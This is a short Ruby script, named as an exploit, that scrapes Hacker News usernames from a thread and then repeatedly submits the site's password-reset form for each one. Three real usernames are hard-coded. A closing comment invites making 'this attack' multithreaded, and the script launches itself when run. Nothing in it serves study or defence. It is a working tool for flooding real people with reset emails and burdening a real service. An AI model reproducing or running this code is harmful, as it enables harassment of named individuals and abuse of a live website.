require 'mechanize'

class ExploitYC
  def initialize
    @mechanize = Mechanize.new
    @email_list = ['rtm','pg','sama']
  end


  def scrape(id = 12345693)
    page = @mechanize.get 'https://news.ycombinator.com/item?id='+id.to_s
    page.css('a.hnuser').each { |user| @email_list.push(user.text.strip) }
  end

  def ddos()
    @email_list.each do |user|
      forgot_page = @mechanize.get 'https://news.ycombinator.com/forgot'

      form = forgot_page.forms.first

      form.field_with(name: 's').value = user

      page = form.submit

      pp page.content
    end
  end

  #exercise for the reader as an added bonus in your computational studies make this attack multithreaded
end
a = ExploitYC.new
a.ddos()               
